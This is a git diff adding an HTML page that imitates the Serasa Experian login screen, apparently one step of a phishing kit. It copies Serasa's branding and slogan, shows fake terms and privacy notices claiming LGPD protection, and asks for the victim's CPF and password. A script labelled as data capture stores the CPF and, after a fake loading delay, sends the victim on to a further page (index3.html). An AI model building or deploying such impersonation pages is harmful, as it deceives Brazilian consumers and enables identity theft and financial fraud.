@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Serasa - Acesso</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts (Inter) -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f8f9fa;
+        }
+        .bg-serasa-pink {
+            background-color: #e80070;
+        }
+        .text-serasa-pink {
+            color: #e80070;
+        }
+        .border-serasa-pink {
+            border-color: #e80070;
+        }
+
+        /* Toggle Switch Customizado */
+        .toggle-checkbox:checked {
+            right: 0;
+            border-color: #e80070;
+        }
+        .toggle-checkbox:checked + .toggle-label {
+            background-color: #e80070;
+        }
+
+        /* Animação do Spinner Serasa */
+        @keyframes spinSlow {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .animate-spin-slow {
+            animation: spinSlow 1.5s linear infinite;
+        }
+
+        /* Custom Scrollbar nos Modais */
+        .modal-scroll::-webkit-scrollbar {
+            width: 6px;
+        }
+        .modal-scroll::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 4px;
+        }
+        .modal-scroll::-webkit-scrollbar-thumb {
+            background: #cbd5e1;
+            border-radius: 4px;
+        }
+        .modal-scroll::-webkit-scrollbar-thumb:hover {
+            background: #94a3b8;
+        }
+    </style>
+</head>
+<body class="min-h-screen w-full flex overflow-x-hidden bg-[#f8f9fa] antialiased relative">
+
+    <!-- MODAL DE CARREGAMENTO (AGUARDE) -->
+    <div id="loading-modal" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black/40 backdrop-blur-sm transition-opacity duration-300">
+        <div class="bg-white rounded-2xl shadow-2xl p-8 sm:p-10 w-[90%] max-w-[360px] text-center flex flex-col items-center justify-center space-y-4 border border-gray-100 transform transition-all">
+            
+            <!-- Ícone/Spinner de Carregamento Estilo Serasa -->
+            <div class="relative w-12 h-12 flex items-center justify-center mb-1">
+                <div class="w-10 h-10 border-4 border-gray-200 border-t-[#e80070] border-r-[#e80070] rounded-full animate-spin"></div>
+                <img src="https://miro.medium.com/v2/resize:fit:1280/1*6vufYTynT97AiH9uOytFpw.png" 
+                     alt="S" 
+                     class="absolute w-5 h-5 object-contain opacity-80">
+            </div>
+
+            <!-- Título Aguarde -->
+            <h2 class="text-xl font-bold text-[#1f2d3d] tracking-tight">
+                Aguarde
+            </h2>
+
+            <!-- Texto de Processamento -->
+            <p class="text-sm text-gray-500 font-normal leading-relaxed">
+                Estamos processando suas informações.
+            </p>
+        </div>
+    </div>
+
+    <!-- MODAL INFORMATIVO: TERMOS DE USO -->
+    <div id="modal-terms" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm p-4 transition-opacity duration-300">
+        <div class="bg-white rounded-2xl shadow-2xl w-full max-w-[500px] max-h-[85vh] flex flex-col overflow-hidden border border-gray-100">
+            <!-- Cabeçalho -->
+            <div class="px-6 py-4 border-b border-gray-100 flex items-center justify-between bg-gray-50">
+                <h3 class="text-base sm:text-lg font-bold text-gray-800 flex items-center gap-2">
+                    <span class="w-2 h-2 rounded-full bg-serasa-pink"></span>
+                    Termos de Uso
+                </h3>
+                <button type="button" class="btn-close-modal text-gray-400 hover:text-gray-600 p-1 rounded-lg transition">
+                    <svg class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
+                    </svg>
+                </button>
+            </div>
+            <!-- Conteúdo -->
+            <div class="p-6 overflow-y-auto modal-scroll space-y-4 text-xs sm:text-sm text-gray-600 leading-relaxed">
+                <p>Bem-vindo aos serviços digitais da Serasa. Ao utilizar nossa plataforma, você concorda expressamente com as condições detalhadas nestes Termos de Uso.</p>
+                
+                <h4 class="font-semibold text-gray-800 text-sm pt-2">1. Aceitação dos Termos</h4>
+                <p>O acesso e uso dos serviços dependem da aceitação integral destes termos. Ao preencher seus dados, você confirma a veracidade das informações prestadas.</p>
+                
+                <h4 class="font-semibold text-gray-800 text-sm pt-2">2. Uso do Serviço</h4>
+                <p>A plataforma destina-se a consultas de pontuação de crédito, renegociação de dívidas, consulta de CPF/CNPJ e gerenciamento financeiro pessoal ou empresarial.</p>
+                
+                <h4 class="font-semibold text-gray-800 text-sm pt-2">3. Segurança da Conta</h4>
+                <p>A Serasa está comprometida com a proteção total dos seus dados pessoais em conformidade com a LGPD (Lei Geral de Proteção de Dados - Lei nº 13.709/2018).</p>
+                
+                <h4 class="font-semibold text-gray-800 text-sm pt-2">4. Atualização dos Termos</h4>
+                <p>A Serasa reserva-se o direito de atualizar este documento periodicamente para refletir mudanças na legislação ou em nossas funcionalidades.</p>
+            </div>
+            <!-- Rodapé -->
+            <div class="px-6 py-3 border-t border-gray-100 bg-gray-50 flex justify-end">
+                <button type="button" class="btn-close-modal px-5 py-2 bg-serasa-pink text-white font-medium text-xs sm:text-sm rounded-lg hover:bg-pink-700 transition">
+                    Entendido
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL INFORMATIVO: POLÍTICA DE PRIVACIDADE -->
+    <div id="modal-privacy" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm p-4 transition-opacity duration-300">
+        <div class="bg-white rounded-2xl shadow-2xl w-full max-w-[500px] max-h-[85vh] flex flex-col overflow-hidden border border-gray-100">
+            <!-- Cabeçalho -->
+            <div class="px-6 py-4 border-b border-gray-100 flex items-center justify-between bg-gray-50">
+                <h3 class="text-base sm:text-lg font-bold text-gray-800 flex items-center gap-2">
+                    <span class="w-2 h-2 rounded-full bg-serasa-pink"></span>
+                    Política de Privacidade
+                </h3>
+                <button type="button" class="btn-close-modal text-gray-400 hover:text-gray-600 p-1 rounded-lg transition">
+                    <svg class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
+                    </svg>
+                </button>
+            </div>
+            <!-- Conteúdo -->
+            <div class="p-6 overflow-y-auto modal-scroll space-y-4 text-xs sm:text-sm text-gray-600 leading-relaxed">
+                <p>A Serasa respeita a sua privacidade e está comprometida com a proteção total dos seus dados pessoais em conformidade com a LGPD (Lei Geral de Proteção de Dados - Lei nº 13.709/2018).</p>
+                
+                <h4 class="font-semibold text-gray-800 text-sm pt-2">1. Coleta de Informações</h4>
+                <p>Coletamos dados necessários para autenticação e prestação de serviços, como CPF, nome, e-mail, telefone e informações financeiras necessárias para a análise de perfil de crédito.</p>
+                
+                <h4 class="font-semibold text-gray-800 text-sm pt-2">2. Finalidade do Tratamento</h4>
+                <p>Seus dados são utilizados para garantir a segurança no acesso, personalizar sua experiência, exibir propostas de negociação e proteção contra fraudes.</p>
+                
+                <h4 class="font-semibold text-gray-800 text-sm pt-2">3. Seus Direitos (LGPD)</h4>
+                <p>Você tem o direito de solicitar a confirmação do tratamento, acesso aos dados, correção de informações incompletas ou revogação de consentimentos a qualquer momento.</p>
+                
+                <h4 class="font-semibold text-gray-800 text-sm pt-2">4. Proteção e Armazenamento</h4>
+                <p>Empregamos padrões internacionais de segurança da informação, criptografia ponta a ponta e rígidos controles de acesso para manter seus dados protegidos.</p>
+            </div>
+            <!-- Rodapé -->
+            <div class="px-6 py-3 border-t border-gray-100 bg-gray-50 flex justify-end">
+                <button type="button" class="btn-close-modal px-5 py-2 bg-serasa-pink text-white font-medium text-xs sm:text-sm rounded-lg hover:bg-pink-700 transition">
+                    Entendido
+                </button>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- CONTAINER PRINCIPAL SPLIT (FULL SCREEN) -->
+    <div class="w-full min-h-screen flex">
+
+        <!-- LADO ESQUERDO: BANNER ROSA (DESKTOP) -->
+        <aside class="hidden lg:flex lg:w-[320px] xl:w-[380px] bg-serasa-pink text-white flex-col justify-between p-8 xl:p-10 relative flex-shrink-0 select-none overflow-hidden">
+            
+            <!-- Logo / Ícone Serasa Branded Topo -->
+            <div class="z-10">
+                <img src="https://miro.medium.com/v2/resize:fit:1280/1*6vufYTynT97AiH9uOytFpw.png" 
+                     alt="Serasa Logo" 
+                     class="w-10 h-10 object-contain brightness-0 invert">
+            </div>
+
+            <!-- Chamada Principal de Texto Exata da Foto -->
+            <div class="z-10 mt-8 mb-auto space-y-1">
+                <p class="text-2xl xl:text-3xl font-extrabold leading-tight tracking-tight text-white">
+                    Na Serasa<br>você pode
+                </p>
+                <div class="bg-white text-serasa-pink inline-block px-2 py-1 font-extrabold text-2xl xl:text-3xl leading-tight rounded-sm shadow-sm">
+                    pagar suas
+                </div>
+                <div class="bg-white text-serasa-pink inline-block px-2 py-1 font-extrabold text-2xl xl:text-3xl leading-tight rounded-sm shadow-sm">
+                    contas pelo
+                </div>
+                <div class="bg-white text-serasa-pink inline-block px-2 py-1 font-extrabold text-2xl xl:text-3xl leading-tight rounded-sm shadow-sm">
+                    app Serasa.
+                </div>
+            </div>
+
+            <!-- Marca d'água discreta no canto inferior -->
+            <div class="absolute bottom-3 left-4 opacity-20 text-[10px]">
+                Serasa Experian © 2026
+            </div>
+        </aside>
+
+
+        <!-- LADO DIREITO: CARD DE LOGIN CENTRALIZADO -->
+        <main class="flex-1 flex flex-col items-center justify-center p-4 sm:p-6 lg:p-12 bg-[#f8f9fa]">
+            
+            <!-- Wrapper para manter a largura alinhada -->
+            <div class="w-full max-w-[400px] flex flex-col space-y-3">
+                
+                <!-- ÍCONE MAIOR FORA DO CARD -->
+                <div class="flex justify-start px-1 mb-1">
+                    <img src="https://miro.medium.com/v2/resize:fit:1280/1*6vufYTynT97AiH9uOytFpw.png" 
+                         alt="Serasa" 
+                         class="w-16 h-16 sm:w-20 sm:h-20 object-contain drop-shadow-sm">
+                </div>
+
+                <!-- CARD DE AUTENTICAÇÃO -->
+                <div class="w-full bg-white rounded-2xl shadow-lg border border-gray-100 p-6 sm:p-8 space-y-5 transition-all duration-300">
+                    
+                    <!-- PASSO 1: DIGITAR CPF -->
+                    <div id="step-cpf" class="space-y-5">
+                        
+                        <!-- Botão Voltar Dentro do Modal em Rosa (Etapa CPF) -->
+                        <div>
+                            <button type="button" id="btn-back-cpf" class="inline-flex items-center space-x-1.5 text-serasa-pink hover:opacity-80 transition text-xs sm:text-sm font-semibold group py-1">
+                                <svg class="w-4 h-4 transform group-hover:-translate-x-1 transition-transform stroke-current" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
+                                    <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
+                                </svg>
+                                <span>Voltar</span>
+                            </button>
+                        </div>
+
+                        <!-- Título -->
+                        <h1 class="text-xl sm:text-2xl font-bold text-gray-800 tracking-tight">
+                            Digite seu CPF
+                        </h1>
+
+                        <!-- Formulário de Autenticação CPF -->
+                        <form id="cpf-form" onsubmit="event.preventDefault();" class="space-y-4">
+                            
+                            <!-- Campo CPF com Ícone de Alerta interno -->
+                            <div class="space-y-1">
+                                <div class="relative flex items-center">
+                                    <input type="text" 
+                                           id="cpf-input" 
+                                           maxlength="14" 
+                                           placeholder="000.000.000-00" 
+                                           class="w-full px-3.5 py-3 text-sm text-gray-800 placeholder-gray-400 bg-white border border-gray-300 rounded-lg focus:outline-none focus:border-serasa-pink focus:ring-1 focus:ring-serasa-pink transition pr-10 font-medium">
+                                    
+                                    <!-- Ícone Triângulo de Alerta -->
+                                    <div class="absolute right-3 text-gray-400 pointer-events-none">
+                                        <svg class="w-5 h-5 stroke-current" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8">
+                                            <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+                                        </svg>
+                                    </div>
+                                </div>
+
+                                <!-- Texto Informativo / Aviso -->
+                                <p id="cpf-error" class="text-[11px] text-serasa-pink font-normal pl-0.5">
+                                    Informe o seu CPF
+                                </p>
+                            </div>
+
+                            <!-- Toggle: Lembrar CPF -->
+                            <div class="flex items-center justify-between pt-2 pb-2">
+                                <label for="remember-cpf" class="text-xs text-gray-600 font-normal cursor-pointer select-none">
+                                    Lembrar CPF para o próximo acesso
+                                </label>
+                                
+                                <div class="relative inline-block w-10 align-middle select-none">
+                                    <input type="checkbox" id="remember-cpf" class="toggle-checkbox absolute block w-5 h-5 rounded-full bg-white border-2 border-gray-300 appearance-none cursor-pointer transition-all duration-200 ease-in-out checked:right-0 right-5 top-0 z-10">
+                                    <label for="remember-cpf" class="toggle-label block overflow-hidden h-5 rounded-full bg-gray-200 cursor-pointer transition-colors duration-200"></label>
+                                </div>
+                            </div>
+
+                            <!-- Links de Suporte e Termos -->
+                            <div class="text-center space-y-2 pt-4 pb-2 border-t border-gray-50">
+                                <p class="text-[11px] text-gray-500">
+                                    <a href="#" class="open-terms hover:underline text-gray-600">Termos de Uso</a> e <a href="#" class="open-privacy hover:underline text-gray-600">Política de Privacidade</a>
+                                </p>
+                            </div>
+
+                            <!-- Botão Continuar -->
+                            <div class="pt-2">
+                                <button type="button" 
+                                        id="btn-continue" 
+                                        disabled
+                                        class="w-full py-3 px-4 bg-gray-200 text-gray-400 font-medium text-xs sm:text-sm rounded-lg cursor-not-allowed transition duration-200 select-none shadow-sm text-center">
+                                    Continuar
+                                </button>
+                            </div>
+
+                        </form>
+                    </div>
+
+                    <!-- PASSO 2: DIGITAR SENHA (INICIALMENTE OCULTO) -->
+                    <div id="step-password" class="hidden space-y-5">
+                        
+                        <!-- Botão Voltar Dentro do Modal em Rosa (Etapa Senha) -->
+                        <div>
+                            <button type="button" id="btn-back-pass" class="inline-flex items-center space-x-1.5 text-serasa-pink hover:opacity-80 transition text-xs sm:text-sm font-semibold group py-1">
+                                <svg class="w-4 h-4 transform group-hover:-translate-x-1 transition-transform stroke-current" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
+                                    <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
+                                </svg>
+                                <span>Voltar</span>
+                            </button>
+                        </div>
+
+                        <!-- Título e CPF Confirmado -->
+                        <div class="space-y-1">
+                            <h1 class="text-xl sm:text-2xl font-bold text-gray-800 tracking-tight">
+                                Digite sua senha
+                            </h1>
+                            <p class="text-xs text-gray-500 pt-1">
+                                CPF: <strong id="display-cpf" class="text-gray-700 font-semibold">---.---.---.--</strong>
+                            </p>
+                        </div>
+
+                        <!-- Formulário de Autenticação Senha -->
+                        <form id="password-form" class="space-y-4">
+                            
+                            <!-- Campo Senha com botão de Ver/Ocultar -->
+                            <div class="space-y-1">
+                                <div class="relative flex items-center">
+                                    <input type="password" 
+                                           id="password-input" 
+                                           placeholder="Digite sua senha" 
+                                           class="w-full px-3.5 py-3 text-sm text-gray-800 placeholder-gray-400 bg-white border border-gray-300 rounded-lg focus:outline-none focus:border-serasa-pink focus:ring-1 focus:ring-serasa-pink transition pr-10 font-medium">
+                                    
+                                    <!-- Botão Toggle Olho (Mostrar/Ocultar Senha) -->
+                                    <button type="button" id="toggle-password" class="absolute right-3 text-gray-400 hover:text-gray-600 transition">
+                                        <svg id="eye-icon" class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8">
+                                            <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                                            <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                                        </svg>
+                                    </button>
+                                </div>
+
+                                <p id="password-error" class="text-[11px] text-serasa-pink font-normal pl-0.5 min-h-[16px]"></p>
+                            </div>
+
+                            <!-- Link Esqueci minha senha no Lado Esquerdo -->
+                            <div class="flex justify-start pt-0.5">
+                                <a href="#" class="text-xs text-serasa-pink font-semibold hover:underline">
+                                    Esqueci minha senha
+                                </a>
+                            </div>
+
+                            <!-- Links de Suporte e Termos -->
+                            <div class="text-center space-y-2 pt-4 pb-2 border-t border-gray-50">
+                                <p class="text-xs text-gray-600">
+                                    Precisa de ajuda? <a href="#" class="text-serasa-pink font-semibold hover:underline">Central de Ajuda</a>
+                                </p>
+                                <p class="text-[11px] text-gray-500">
+                                    <a href="#" class="open-terms hover:underline text-gray-600">Termos de Uso</a> e <a href="#" class="open-privacy hover:underline text-gray-600">Política de Privacidade</a>
+                                </p>
+                            </div>
+
+                            <!-- Botão Entrar -->
+                            <div class="pt-2">
+                                <button type="submit" 
+                                        id="btn-login" 
+                                        disabled
+                                        class="w-full py-3 px-4 bg-gray-200 text-gray-400 font-medium text-xs sm:text-sm rounded-lg cursor-not-allowed transition duration-200 select-none shadow-sm text-center">
+                                    Entrar
+                                </button>
+                            </div>
+
+                        </form>
+                    </div>
+
+                </div>
+
+            </div>
+
+        </main>
+
+    </div>
+
+    <!-- Script de Controle do Fluxo, Modais e Captura de Dados -->
+    <script>
+        const stepCpf = document.getElementById('step-cpf');
+        const stepPassword = document.getElementById('step-password');
+        const loadingModal = document.getElementById('loading-modal');
+        
+        const cpfInput = document.getElementById('cpf-input');
+        const btnContinue = document.getElementById('btn-continue');
+        const cpfError = document.getElementById('cpf-error');
+        
+        const displayCpf = document.getElementById('display-cpf');
+        const passwordInput = document.getElementById('password-input');
+        const passwordForm = document.getElementById('password-form');
+        const btnLogin = document.getElementById('btn-login');
+        const togglePassword = document.getElementById('toggle-password');
+        const eyeIcon = document.getElementById('eye-icon');
+        
+        const btnBackCpf = document.getElementById('btn-back-cpf');
+        const btnBackPass = document.getElementById('btn-back-pass');
+
+        // Formatação Máscara CPF (000.000.000-00)
+        cpfInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 11) value = value.slice(0, 11);
+
+            if (value.length > 9) {
+                value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{1,2})$/, '$1.$2.$3-$4');
+            } else if (value.length > 6) {
+                value = value.replace(/^(\d{3})(\d{3})(\d{1,3})$/, '$1.$2.$3');
+            } else if (value.length > 3) {
+                value = value.replace(/^(\d{3})(\d{1,3})$/, '$1.$2');
+            }
+
+            e.target.value = value;
+
+            const rawValue = value.replace(/\D/g, '');
+            if (rawValue.length === 11) {
+                btnContinue.disabled = false;
+                btnContinue.classList.remove('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
+                btnContinue.classList.add('bg-serasa-pink', 'text-white', 'hover:bg-pink-700', 'cursor-pointer');
+                cpfError.innerText = '';
+            } else {
+                btnContinue.disabled = true;
+                btnContinue.classList.add('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
+                btnContinue.classList.remove('bg-serasa-pink', 'text-white', 'hover:bg-pink-700', 'cursor-pointer');
+                cpfError.innerText = 'Informe o seu CPF';
+            }
+        });
+
+        // Clique no Botão Continuar -> Exibe Modal por 2 segundos -> Troca para Senha
+        btnContinue.addEventListener('click', () => {
+            if (!btnContinue.disabled) {
+                loadingModal.classList.remove('hidden');
+
+                setTimeout(() => {
+                    loadingModal.classList.add('hidden');
+                    displayCpf.innerText = cpfInput.value;
+                    stepCpf.classList.add('hidden');
+                    stepPassword.classList.remove('hidden');
+                    passwordInput.focus();
+                }, 2000);
+            }
+        });
+
+        // Botão Voltar da Etapa CPF -> Redireciona para index.html
+        btnBackCpf.addEventListener('click', () => {
+            window.location.href = 'index.html';
+        });
+
+        // Botão Voltar da Etapa Senha -> Retorna para Etapa CPF
+        btnBackPass.addEventListener('click', () => {
+            stepPassword.classList.add('hidden');
+            stepCpf.classList.remove('hidden');
+            cpfInput.focus();
+        });
+
+        // Validação da Senha
+        passwordInput.addEventListener('input', (e) => {
+            if (e.target.value.trim().length >= 4) {
+                btnLogin.disabled = false;
+                btnLogin.classList.remove('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
+                btnLogin.classList.add('bg-serasa-pink', 'text-white', 'hover:bg-pink-700', 'cursor-pointer');
+            } else {
+                btnLogin.disabled = true;
+                btnLogin.classList.add('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
+                btnLogin.classList.remove('bg-serasa-pink', 'text-white', 'hover:bg-pink-700', 'cursor-pointer');
+            }
+        });
+
+        // Toggle Mostrar/Ocultar Senha
+        togglePassword.addEventListener('click', () => {
+            const isPassword = passwordInput.type === 'password';
+            passwordInput.type = isPassword ? 'text' : 'password';
+            
+            eyeIcon.innerHTML = isPassword 
+                ? `<path stroke-linecap="round" stroke-linejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858-5.908a10.018 10.018 0 013.682-.763c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21M3 3l18 18" />`
+                : `<path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />`;
+        });
+
+// CAPTURA DO CPF E REDIRECIONAMENTO AO ENTRAR
+passwordForm.addEventListener('submit', (e) => {
+    e.preventDefault();
+
+    if (!btnLogin.disabled) {
+        // Captura apenas o CPF
+        const cpfValue = cpfInput.value.trim();
+
+        // Armazena somente o CPF
+        sessionStorage.setItem('serasa_cpf', cpfValue);
+
+        // Exibe o modal de carregamento por 2 segundos antes de redirecionar
+        loadingModal.classList.remove('hidden');
+
+        setTimeout(() => {
+            window.location.href = 'index3.html';
+        }, 2000);
+    }
+});
+
+// CONTROLE DOS MODAIS INFORMATIVOS (Termos de Uso e Política de Privacidade)
+const modalTerms = document.getElementById('modal-terms');
+const modalPrivacy = document.getElementById('modal-privacy');
+
+// Abrir Termos de Uso
+document.querySelectorAll('.open-terms').forEach(el => {
+    el.addEventListener('click', (e) => {
+        e.preventDefault();
+        modalTerms.classList.remove('hidden');
+    });
+});
+
+// Abrir Política de Privacidade
+document.querySelectorAll('.open-privacy').forEach(el => {
+    el.addEventListener('click', (e) => {
+        e.preventDefault();
+        modalPrivacy.classList.remove('hidden');
+    });
+});
+
+// Fechar Modais através dos botões
+document.querySelectorAll('.btn-close-modal').forEach(btn => {
+    btn.addEventListener('click', () => {
+        modalTerms.classList.add('hidden');
+        modalPrivacy.classList.add('hidden');
+    });
+});
+
+// Fechar ao clicar na área escura (backdrop)
+[modalTerms, modalPrivacy].forEach(modal => {
+    if (modal) {
+        modal.addEventListener('click', (e) => {
+            if (e.target === modal) {
+                modal.classList.add('hidden');
+            }
+        });
+    }
+});
+    </script>
+
+</body>
+</html>
